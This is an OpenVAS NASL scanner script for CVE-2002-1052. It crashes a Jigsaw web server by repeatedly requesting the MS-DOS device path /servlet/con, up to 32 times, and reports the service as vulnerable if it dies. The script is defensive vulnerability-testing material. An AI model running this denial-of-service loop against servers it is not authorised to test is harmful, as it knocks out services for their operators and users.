# OpenVAS Vulnerability Test
# $Id: jigsaw_msdos_dev_DoS.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Jigsaw webserver MS/DOS device DoS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added BugtraqID and CAN
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "It was possible to crash the Jigsaw web 
server by requesting /servlet/con about 30 times.

A cracker may use this attack to make this
service crash continuously.";

tag_solution = "upgrade your software";

# From: "Peter_Gr�ndl" <pgrundl@kpmg.dk>
# To: "vulnwatch" <vulnwatch@vulnwatch.org>
# Date: Wed, 17 Jul 2002 11:36:33 +0200
# Subject: [VulnWatch] KPMG-2002034: Jigsaw Webserver DOS device DoS

if(description)
{
 script_id(11047);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(5251, 5258);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_tag(name:"risk_factor", value:"Medium");
 script_cve_id("CVE-2002-1052");
 name = "Jigsaw webserver MS/DOS device DoS";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;



 script_description(desc);
 
 summary = "Jigsaw DOS dev DoS";
 script_summary(summary);
 
 script_category(ACT_DENIAL);
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 family = "Denial of Service";

 script_family(family);
 script_dependencies("find_service.nasl");
 script_require_ports("Services/www", 80);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#

include("http_func.inc");



port = get_http_port(default:80);

if (! get_port_state(port)) exit(0);

if (http_is_dead(port: port)) exit(0);


soc = http_open_socket(port);
if (!soc) exit(0);


req = http_get(item:"/servlet/con", port: port);

for (i=0; i<32;i=i+1)
{
 send(socket:soc, data:req);
 r = http_recv(socket:soc);
 http_close_socket(soc);
 soc = http_open_socket(port);
 if (! soc)
 {
   security_warning(port);
   exit(0);
 }
}

close(soc);

if(http_is_dead(port:port))security_warning(port);


